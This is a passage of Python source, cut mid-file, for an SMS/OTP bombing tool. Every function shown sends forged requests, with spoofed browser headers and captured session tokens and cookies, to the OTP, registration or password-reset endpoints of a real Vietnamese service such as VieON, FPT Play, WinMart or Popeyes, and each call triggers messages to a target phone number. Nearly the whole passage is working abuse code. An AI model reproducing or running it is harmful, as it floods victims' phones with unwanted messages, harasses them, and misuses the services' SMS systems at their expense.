    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "VIEON: THÀNH CÔNG!"))
    else:
        print(format_print("x", "VIEON: THẤT BẠI!"))

def ahamove(phone):
    mail = random_string(6)
    Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
    Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)
    if Response.status_code == 200:
        print(format_print("*", "AHAMOVE: THÀNH CÔNG!"))
    else:
        print(format_print("x", "AHAMOVE: THẤT BẠI!"))

def concung(phone):
    Headers = {"Host": "concung.com","content-length": "121","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://concung.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://concung.com/dang-nhap.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_BBD6001M29\u003dGS1.1.1679234342.1.1.1679234352.50.0.0"}
    Payload = {"ajax": "1","classAjax": "AjaxLogin","methodAjax": "sendOtpLogin","customer_phone": phone,"id_customer": "0","momoapp": "0","back": "khach-hang.html"}
    response = requests.post("https://concung.com/ajax.html", data=Payload, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "CONCUNG: THÀNH CÔNG!"))
    else:
        print(format_print("x", "CONCUNG: THẤT BẠI!"))

def vietid(phone):
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "VIETID: THÀNH CÔNG!"))
    else:
        print(format_print("x", "VIETID: THẤT BẠI!"))

def fptplay(phone):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "FPTPLAY: THÀNH CÔNG!"))
    else:
        print(format_print("x", "FPTPLAY: THẤT BẠI!"))

def funring(phone):
    Headers = {"Host": "funring.vn","Connection": "keep-alive","Content-Length": "28","Accept": "*/*","User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","Content-Type": "application/json","Origin": "http://funring.vn","Referer": "http://funring.vn/module/register_mobile.jsp","Accept-Encoding": "gzip, deflate","Accept-Language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","Cookie": "JSESSIONID\u003dNODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; _ga\u003dGA1.2.1626827841.1679236846; _gid\u003dGA1.2.888694467.1679236846; _gat\u003d1"}
    Datason = json.dumps({"username": phone[1:11]})
    response = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp", data=Datason, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "FUNRING: THÀNH CÔNG!"))
    else:
        print(format_print("x", "FUNRING: THẤT BẠI!"))

def gotadi(phone):
    Headers = {"Host": "api.gotadi.com","content-length": "44","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json","sec-ch-ua-platform": "\"Android\"","gtd-client-tracking-device-id": "85519cab-85d7-4881-abfa-65d2a2bb3a52","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","content-type": "application/json","origin": "https://www.gotadi.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.gotadi.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phoneNumber": phone,"language":"VI"})
    response = requests.post("https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp", data=Datason, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "GOTADI: THÀNH CÔNG!"))
    else:
        print(format_print("x", "GOTADI: THẤT BẠI!"))

def winmart(phone):
    response = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}")
    if response.status_code == 200:
        print(format_print("*", "WINMART: THÀNH CÔNG!"))
    else:
        print(format_print("x", "WINMART: THẤT BẠI!"))

def moneydong(phone):
    Headers = {"Host": "api.moneydong.vip","content-length": "72","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://h5.moneydong.vip","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://h5.moneydong.vip/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Payload = {"phone": phone[1:11], "type": "2", "ctype": "1", "chntoken": "69ad075c94c279e43608c5d50b77e8b9"}
    response = requests.post("https://api.moneydong.vip/h5/LoginMessage_ultimate", data=Payload, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "MONEYDONG: THÀNH CÔNG!"))
    else:
        print(format_print("x", "MONEYDONG: THẤT BẠI!"))

def daihocfpt(phone):
    response = requests.get(f"https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?resend_opt=1&mobile={phone}")
    if response.status_code == 200:
        print(format_print("*", "DAIHOCFPT: THÀNH CÔNG!"))
    else:
        print(format_print("x", "DAIHOCFPT: THẤT BẠI!"))

def cafeland(phone):
    Headers = {"Host": "nhadat.cafeland.vn","content-length": "65","accept": "application/json, text/javascript, */*; q\u003d0.01","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://nhadat.cafeland.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://nhadat.cafeland.vn/dang-ky.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "laravel_session\u003deyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJtYWMiOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0%3D"}
    Payload = {"mobile": phone,"_token": "bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w",}
    response = requests.post("https://nhadat.cafeland.vn/member-send-otp/", data=Payload, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "CAFELAND: THÀNH CÔNG!"))
    else:
        print(format_print("x", "CAFELAND: THẤT BẠI!"))
        

# Old - New Api [ Call ] Filter

def oldvayvnd(phone):
    response = requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login": phone}))
    if response.status_code == 200:
        print(format_print("*", "VAYVND: THÀNH CÔNG!"))
    else:
        print(format_print("x", "VAYVND: THẤT BẠI!"))

def oldtamo(phone):
    response = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number": phone}}))
    if response.status_code == 200:
        print(format_print("*", "TAMO: THÀNH CÔNG!"))
    else:
        print(format_print("x", "TAMO: THẤT BẠI!"))

def oldsenmo(phone):
    response = requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+phone[1:11]}))
    if response.status_code == 200:
        print(format_print("*", "SENMO: THÀNH CÔNG!"))
    else:
        print(format_print("x", "SENMO: THẤT BẠI!"))

def thantaioi(phone):
    Headers = {"Host": "api.thantaioi.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://thantaioi.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://thantaioi.vn/user/login","accept-encoding": "gzip, deflate, br","cookie": "_ga_LBS7YCVKY6\u003dGS1.1.1681807570.2.1.1681807596.34.0.0"}
    Datason = json.dumps({"phone": f"84{phone[1:11]}"})
    response = requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", data=Datason, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "THANTAIOI: THÀNH CÔNG!"))
    else:
        print(format_print("x", "THANTAIOI: THẤT BẠI!"))

def atmonline(phone):
    Headers = {"Host": "atmonline.com.vn","content-length": "46","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json","sec-ch-ua-mobile": "?1","authorization": "","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://atmonline.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://atmonline.com.vn/portal-new/login?mobilePhone\u003d0777531398\u0026requestedAmount\u003d4000000\u0026requestedTerm\u003d4\u0026locale\u003dvn\u0026designType\u003dNEW","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_181P8FC3KD\u003dGS1.1.1681739176.1.1.1681739193.43.0.0"}
    Datason = json.dumps({"mobilePhone": phone,"source":"ONLINE"})
    response = requests.post("https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",  data=Datason, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "ATMONLINE: THÀNH CÔNG!"))
    else:
        print(format_print("x", "ATMONLINE: THẤT BẠI!"))   


# [ OTHER ]
def popeyes(sdt):
  headers = {
    'Host': 'api.popeyes.vn',
    # 'content-length': '104',
    'accept': 'application/json',
    'x-client': 'WebApp',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://popeyes.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://popeyes.vn/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  data = '{"phone":"%s","firstName":"Cac","lastName":"Lo","email":"kong@gmail.com","password":"12345gdtg"}' %sdt #replace("sdt",sdt)
  response = requests.post('https://api.popeyes.vn/api/v1/register', headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "popeyes: THÀNH CÔNG!"))
  else:
      print(format_print("x", "popeyes: THẤT BẠI!"))   
  

def alfrescos(sdt):
  headers = {
    'Host': 'api.alfrescos.com.vn',
    # 'content-length': '124',
    'accept': 'application/json, text/plain, */*',
    'brandcode': 'ALFRESCOS',
    'devicecode': 'web',
    'accept-language': 'vi-VN',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://alfrescos.com.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://alfrescos.com.vn/',
    # 'accept-encoding': 'gzip, deflate',
    }
  params = {
    'culture': 'vi-VN',
  }
  data = '{"phoneNumber":"%s","secureHash":"66148faf3cab6e527b8b044745e27dbd","deviceId":"","sendTime":1693660146481,"type":1}' %sdt #replace("sdt",sdt)
  response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "alfrescos: THÀNH CÔNG!"))
  else:
      print(format_print("x", "alfrescos: THẤT BẠI!"))   
    
    
def bibabo(sdt):
    headers = {
        "Host": "bibabo.vn",
        "Connection": "keep-alive",
        "Content-Length": "64",
        "Accept": "/",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "Origin": "https://bibabo.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bibabo.vn/user/signupPhone",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        #"Cookie": "uibi=eyJpdiI6IlQyam9wWko1MGRQVXNTMnZOZEZpWGc9PSIsInZhbHVlIjoiYjV5SlR1V0tVbjdFNFwvK2FBUzIwbWZWT0YzOUdvR2cyQzZKQXI5OHFKOHM9IiwibWFjIjoiZmFiZWVkOTA0ZmE3NjJkZTRhMzI4MGQ0OWQxMTBjMmZmZjQ2ZTc0ZGYxODhlMmFiNTMwMzVlZjc0Y2MyMTg2NCJ9; ga=GA1.2.55963624.1683002314; gid=GA1.2.593754343.1683002314; mp376a95ebc99b460db45b090a5936c5demixpanel=%7B%22distinctid%22%3A%20%22%24device%3A187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24deviceid%22%3A%20%22187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24initialreferrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2Fhome%22%2C%22%24initialreferringdomain%22%3A%20%22bibabo.vn%22%7D; gat=1; gaVisitorUuid=47008ca1-32a0-4daa-9694-e36807c4dd91; fbp=fb.1.1683002315008.1108739564; XSRF-TOKEN=eyJpdiI6InNtOGtVeHBSZmVoQjR0N1wvRW1hckF3PT0iLCJ2YWx1ZSI6IlNLQ0p3UFlUZGhjdENKSFM1cHdLeXJGcFVGaE1EaDNKa0VRNk40cWo1enFCTERSTVowaEczSzc0WitTNks4am9VcE40KzAzVCtwbUVkeGVZUE1mcER3PT0iLCJtYWMiOiIzYzAxZGZmNzMxOWM3NWExOTY1MmFmYjNkMzhiOGM4OGNhMDQxNmRhZDA4YTY2ZmZhOTNjY2RhN2FiZjZlOTVmIn0%3D; laravelsession=eyJpdiI6Ind5blczNnFrMzRWbTJEbDRVcGNRaXc9PSIsInZhbHVlIjoiZXQyQUJoS3NuTXd4RUljMEhLQUZkS0Q0MEdSdGUrb09PdURXSm03d2xOS2pDRThjbERCUzlyeEpTR3VHTVUxOXd0UTVOVnppXC92WVFyOTZKS240KzBnPT0iLCJtYWMiOiJjMWQ5MWQ5YjdjYTZlODc5MjI2YmNjZTM5YjZlMWVmMThiYmRlMTIzYTI1M2E1YmIzZDc5MDExNGJlODRhYjUwIn0%3D"
    }
    payload = {
        "phone": sdt,
        "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"
    }
    response = requests.post("https://bibabo.vn/user/verify-phone", headers=headers, data=payload)
    if response.status_code == 200:
        print(format_print("*", "bibabo: THÀNH CÔNG!"))
    else:
        print(format_print("x", "bibabo: THẤT BẠI!"))   
        
    
def thantaioilo(phone):
    Headers = {"Host": "api.thantaioi.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://thantaioi.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://thantaioi.vn/user/login","accept-encoding": "gzip, deflate, br","cookie": "_ga_LBS7YCVKY6\u003dGS1.1.1681807570.2.1.1681807596.34.0.0"}
    Datason = json.dumps({"phone": f"84{phone[1:11]}"})
    response = requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", data=Datason, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "thantaioilo: THÀNH CÔNG!"))
    else:
        print(format_print("x", "thantaioilo: THẤT BẠI!"))   
        
        
def tv360(phone):
    response = requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]}))
    if response.status_code == 200:
        print(format_print("*", "tv360: THÀNH CÔNG!"))
    else:
        print(format_print("x", "tv360: THẤT BẠI!"))   
        
        
def fpt(phone):
    response = requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone})
    if response.status_code == 200:
        print(format_print("*", "fpt: THÀNH CÔNG!"))
    else:
        print(format_print("x", "fpt: THẤT BẠI!"))   
        

def oldloship(phone):
